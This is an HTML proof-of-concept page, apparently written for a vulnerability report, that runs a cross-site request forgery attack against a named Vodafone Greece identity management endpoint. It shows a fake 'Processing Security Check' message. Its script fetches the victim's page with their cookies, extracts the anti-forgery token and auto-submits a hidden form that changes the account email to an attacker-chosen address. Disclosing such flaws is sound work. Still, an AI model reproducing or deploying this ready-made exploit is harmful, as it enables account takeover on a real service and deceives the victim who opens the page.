<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
    <div id="msg" style="padding:20px; font-family:sans-serif;">
        <h2>Processing Security Check...</h2>
        <p id="status">Syncing Cookies & Tokens...</p>
    </div>

    <script>
        const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";

        async function startAttack() {
            try {
                // 1. سحب التوكن (GET) مع التأكد من إرسال واستقبال الكوكيز
                const response = await fetch(target, { method: 'GET', credentials: 'include' });
                const html = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;

                if (!token) {
                    document.getElementById('status').innerText = "❌ Token not found. (Check Login Status)";
                    return;
                }

                document.getElementById('status').innerText = "✅ Token captured. Launching Final Attack...";

                // 2. بناء فورم مطابق تماماً للـ Burp Request
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = target;

                const data = {
                    'IsEmailConfirmed': 'True',
                    'Email': `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`,
                    'PhoneNumber': '',
                    'Name': 'Xia0Checkmate',
                    'Website': '',
                    'Profile': '',
                    'StreetAddress': '',
                    'Locality': '12',
                    'Region': '',
                    'PostalCode': '',
                    'Country': '',
                    '__RequestVerificationToken': token
                };

                for (const key in data) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = data[key];
                    form.appendChild(input);
                }

                document.body.appendChild(form);
                
                // الضربة القاضية
                setTimeout(() => { form.submit(); }, 1000);

            } catch (err) {
                document.getElementById('status').innerText = "❌ Error: " + err.message;
            }
        }

        window.onload = startAttack;
    </script>
</body>
</html>
